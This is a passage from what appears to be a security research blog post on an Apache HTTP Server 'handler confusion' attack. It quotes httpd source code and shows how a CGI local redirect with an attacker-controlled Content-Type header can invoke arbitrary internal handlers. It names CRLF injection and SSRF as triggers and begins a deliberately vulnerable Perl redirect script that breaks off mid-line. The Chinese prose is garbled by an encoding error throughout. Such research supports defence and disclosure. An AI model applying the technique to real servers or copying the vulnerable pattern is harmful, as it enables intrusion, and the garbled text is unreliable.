&lt;p&gt;Âü∫ÊñºÂâçÈù¢ÊèêÂà∞ÁöÑ &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;double response&lt;/a&gt; Ë°åÁÇ∫‰ª•ÂèäÂâØ‰ΩúÁî®ÔºåÈÄôÂÄãÊîªÊìäÊâãÊ≥ïÈÇÑÂèØ‰ª•ÂÆåÊàêÂÖ∂ÂÆÉÊõ¥ÈÖ∑ÁöÑÂà©Áî®Ôºå‰∏çÈÅéÁî±ÊñºÊ≠§ÂïèÈ°åÂ∞öÊú™ÂÆåÂÖ®‰øÆÂæ©ÔºåÊõ¥ÈÄ≤‰∏ÄÊ≠•ÁöÑÂà©Áî®ÊñπÂºèÔºåÂ∞áÊñº‰øÆÂæ©ÂÆåÊàêÂæåÂÜçÊè≠Èú≤„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-primitive-3-2-invoke-arbitrary-handlers&quot;&gt;‚öîÔ∏è Primitive 3-2. Invoke Arbitrary Handlers&lt;/h4&gt;

&lt;p&gt;‰ªîÁ¥∞ÊÄùËÄÉÂâçÈù¢ Overwrite Handler ÊîªÊìäÊâãÊ≥ïÔºåÈõñÁÑ∂ÊòØÂõ†ÁÇ∫ ModSecurity ‰∏¶Êú™Â•ΩÂ•ΩÁöÑËôïÁêÜÈåØË™§ÔºåÂ∞éËá¥Ë´ãÊ±ÇË¢´Ë®≠ÁΩÆ‰∏äÈåØË™§ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;„ÄÇ ‰ΩÜÂÜçÊ∑±ÂÖ•ÁöÑÊé¢Á©∂ÂÖ∂Ê†πÊú¨ÂéüÂõ†ÊáâË©≤ÊòØ ‚Äî‚Äî &lt;strong&gt;Apache HTTP Server Âú®‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; ÊôÇÔºåÂÖ∂ÂØ¶ÁÑ°ÂæûËæ®Âà•ÂÆÉÁöÑË™ûÊÑèÔºåÈÄôÂÄãÊ¨Ñ‰ΩçÊó¢ÂèØ‰ª•ÊòØÂú®Ë´ãÊ±ÇÈöéÊÆµË¢´Ë™ûÊ≥ïË®≠ÂÆöÂ•ΩÁöÑÂÄºÔºå‰πüÂèØ‰ª•ÊòØÂõûÊáâÈöéÊÆµ‰º∫ÊúçÂô®ÂõûÂÇ≥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; Ê®ôÈ†≠ÁöÑÂÖßÂÆπ„ÄÇ&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ÊâÄ‰ª•ÁêÜË´ñ‰∏äÂ¶ÇÊûúËÉΩÊéßÂà∂‰º∫ÊúçÂô®ÂõûÊáâ‰∏≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; Ê®ôÈ†≠ÁöÑÂÖßÂÆπÔºåÈÇ£Â∞±ÂèØ‰ª•ÈÄèÈÅéÈÇ£ÊÆµÂæûÈñãÁôºÂàùÊúüÈÅ∫ÁïôËá≥‰ªäÁöÑÁ®ãÂºèÁ¢ºÂëºÂè´‰ªªÊÑèÁöÑÊ®°ÁµÑËôïÁêÜÂô®ÔºåÈÄô‰πüÊòØ Handler Confusion ÁöÑÊúÄÂæå‰∏ÄÂÄãÊîªÊìäÊâãÊ≥ï ‚Äî‚Äî &lt;strong&gt;ÂëºÂè´‰ªªÊÑè Apache HTTP Server ÁöÑÂÖßÈÉ®Ê®°ÁµÑËôïÁêÜÂô®&lt;/strong&gt;ÔºÅ&lt;/p&gt;

&lt;p&gt;‰ΩÜÈÄôË£°ÈÇÑÊúâÊúÄÂæåÁöÑ‰∏ÄÂ°äÊãºÂúñÂøÖÈ†àÂ°´‰∏äÔºåÂú® Httpd ‰∏≠ÊâÄÊúâÂèØ‰ª•Âæû‰º∫ÊúçÂô®ÂõûÊáâ‰øÆÊîπÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; ÁöÑÂú∞ÊñπÂÖ®ÈÉΩÁôºÁîüÂú®ÈÇ£ÊÆµÈÅ∫ÁïôÁ®ãÂºèÁ¢º‰πãÂæåÔºåÂ∞±ÁÆó‰øÆÊîπÂà∞Ë©≤Ê¨Ñ‰ΩçÁöÑÂÖßÂÆπÔºåÊ≠§ÊôÇ HTTP ÁîüÂëΩÈÄ±Êúü‰πüÈÄ≤ÂÖ•Â∞æËÅ≤ÔºåÁÑ°Ê≥ïÂÜçÂÅöÊõ¥ÈÄ≤‰∏ÄÊ≠•ÁöÑÂà©Áî®‚Ä¶‚Ä¶ ÂóéÔºü&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÊâæ‰∫Ü &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3875&quot;&gt;RFC 3875&lt;/a&gt; ‰æÜÁï∂ÊïëÊè¥ÊäïÊâãÔºÅ RFC 3875 ÊòØ‰∏ÄÂÄãÈóúÊñº CGI ÁöÑË¶èÁØÑÔºåÂÖ∂‰∏≠ &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2&quot;&gt;6.2.2. ÁØÄ&lt;/a&gt;ÂÆöÁæ©‰∫Ü‰∏ÄÂÄã Local Redirect Response Ë°åÁÇ∫:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The CGI script can return a URI path and query-string (‚Äòlocal-pathquery‚Äô) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Á∞°ÂñÆ‰æÜË™™Ë¶èÁØÑ‰∫Ü CGI Âú®ÁâπÂÆöÊ¢ù‰ª∂‰∏ãÂøÖÈ†à‰ΩøÁî®‰º∫ÊúçÂô®Á´ØÁöÑË≥áÊ∫êÂéªËôïÁêÜËΩâÂùÄÔºå‰ªîÁ¥∞Ê™¢Ë¶ñ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; Â∞çÊñºÈÄôÂÄãË¶èÁØÑÁöÑÂØ¶‰ΩúÊúÉÁôºÁèæÔºö&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/generators/mod_cgi.c#L983&quot;&gt;modules/generators/mod_cgi.c#L983&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_scan_script_header_err_brigade_ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1]&lt;/span&gt;
                                                    &lt;span class=&quot;n&quot;&gt;APLOG_MODULE_INDEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log_script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;script_err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTTP_NOT_MODIFIED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apr_table_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers_out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Location&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2]&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* This redirect needs to be a GET no matter what the original
         * method was.
         */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method_number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;cm&quot;&gt;/* We already read the message body (if any), so don&apos;t allow
         * the redirected request to think it has one.  We can ignore
         * Transfer-Encoding, since we used REQUEST_CHUNKED_ERROR.
         */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;apr_table_unset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers_in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Content-Length&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;ap_internal_redirect_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                     &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [3]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;È¶ñÂÖà &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; ÊúÉÂÖàÂü∑Ë°å&lt;sup&gt;[1]&lt;/sup&gt; CGI ‰∏¶ÊéÉÊèèÂÖ∂Ëº∏Âá∫ÁµêÊûú‰∏¶Ë®≠ÁΩÆ‰∏äÁõ∏Â∞çÊáâÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Status&lt;/code&gt; ‰ª•Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;ÔºåÂ¶ÇÊûú&lt;sup&gt;[2]&lt;/sup&gt;ÂõûÂÇ≥ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Status&lt;/code&gt; ÊòØ 200 ‰ª•Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt; Ê®ôÈ†≠Ê¨Ñ‰ΩçÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; ÈñãÈ†≠ÂâáÊääÈÄôÂÄãÂõûÊáâÁï∂Êàê‰∏ÄÂÄã‰º∫ÊúçÂô®Á´ØÁöÑËΩâÂùÄ‰∏¶ÈñãÂßãËôïÁêÜ&lt;sup&gt;[3]&lt;/sup&gt;„ÄÇ ÂÜç‰ªîÁ¥∞ÂØ©Ë¶ñ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_internal_redirect_handler()&lt;/code&gt; ÁöÑÂØ¶‰ΩúÊúÉÁôºÁèæÔºö&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/http/http_request.c#L800&quot;&gt;modules/http/http_request.c#L800&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AP_DECLARE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_internal_redirect_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;internal_internal_redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1]&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* ap_die was already called, if an error occured */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ap_set_content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_process_request_internal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [3]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_invoke_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                   &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [4]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ap_die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Httpd È¶ñÂÖàÂâµÂª∫&lt;sup&gt;[1]&lt;/sup&gt;‰∫Ü‰∏ÄÂÄãÊñ∞ÁöÑË´ãÊ±ÇÁµêÊßã‰∏¶Â∞áÁï∂ÂâçÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; Ë§á&lt;sup&gt;[2]&lt;/sup&gt;ÈÄ≤ÂéªÔºåÂú®Ëôï&lt;sup&gt;[3]&lt;/sup&gt;ÂÆåÁîüÂëΩÈÄ±ÊúüÂæåÂëºÂè´&lt;sup&gt;[4]&lt;/sup&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt; ‚Äî‚Äî ‰πüÂ∞±ÊòØÂâçÈù¢ÊèêÂèäÂåÖÂê´Ê≠∑Âè≤ÈÅ∫ÁïôËΩâÊèõÁöÑÂú∞ÊñπÔºåÊâÄ‰ª•&lt;strong&gt;Âú®‰º∫ÊúçÂô®Á´ØËΩâÂùÄ‰∏≠ÔºåÂ¶ÇÊûúÂèØ‰ª•ÊéßÂà∂ÂõûÊáâÊ®ôÈ†≠ÔºåÂ∞±ÂèØ‰ª•Âú® Httpd ‰∏≠ÂëºÂè´‰ªªÊÑèÁöÑÊ®°ÁµÑËôïÁêÜÂô®„ÄÇ&lt;/strong&gt; Âü∫Êú¨‰∏äÊâÄÊúâ Apache HTTP Server ‰∏≠ÁöÑ CGI Á≥ªÂàóÂØ¶‰ΩúÈÉΩÈÅµÂÆàÈÄôÂÄãË°åÁÇ∫ÔºåÈÄôË£°ÊòØ‰∏ÄÂÄãÁ∞°ÂñÆÁöÑÂàóË°®Ôºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;mod_cgi&lt;/li&gt;
  &lt;li&gt;mod_cgid&lt;/li&gt;
  &lt;li&gt;mod_wsgi&lt;/li&gt;
  &lt;li&gt;mod_uwsgi&lt;/li&gt;
  &lt;li&gt;mod_fastcgi&lt;/li&gt;
  &lt;li&gt;mod_perl&lt;/li&gt;
  &lt;li&gt;mod_asis&lt;/li&gt;
  &lt;li&gt;mod_fcgid&lt;/li&gt;
  &lt;li&gt;mod_proxy_scgi&lt;/li&gt;
  &lt;li&gt;‚Ä¶&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ëá≥ÊñºÂ¶Ç‰ΩïÂú®ÁúüÂØ¶ÊÉÖÂ¢É‰∏≠Ëß∏ÁôºÈÄôÂÄã‰º∫ÊúçÂô®ËΩâÂùÄÂë¢Ôºü Áî±ÊñºËá≥Â∞ëÈúÄË¶ÅÊéßÂà∂ HTTP ÂõûÊáâ‰∏≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; ÂèäÈÉ®ÂàÜ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt;ÔºåÈÄôË£°Áµ¶Âá∫ÂÖ©ÂÄãÊÉÖÂ¢É‰ª•‰æõÂèÉËÄÉÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;‰ΩçÊñº CGI ÂõûÊáâÊ®ôÈ†≠‰∏≠ÁöÑ CRLF InjectionÔºåÈÄèÈÅéÊèõË°åÂéªË¶ÜÂØ´Â∑≤Â≠òÂú®ÁöÑ HTTP Ê®ôÈ†≠&lt;/li&gt;
  &lt;li&gt;ÂèØÂÆåÊï¥ÊéßÂà∂ÂõûÊáâÊ®ôÈ†≠ÁöÑ SSRFÔºå‰æãÂ¶ÇË®óÁÆ°Âú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_wsgi&lt;/code&gt; ‰∏äÁöÑ &lt;a href=&quot;https://django-revproxy.readthedocs.io/en/latest/&quot;&gt;django-revproxy&lt;/a&gt; Â∞àÊ°à&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Êé•‰∏ã‰æÜÁöÑÁØÑ‰æãÈÉΩÂü∫ÊñºÈÄôÂÄã‰∏çÂÆâÂÖ®ÁöÑ CRLF Injection ‰æÜÂÅöÁ§∫ÁØÑÔºö&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/perl &lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$redir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$redir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;m{^https?://}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
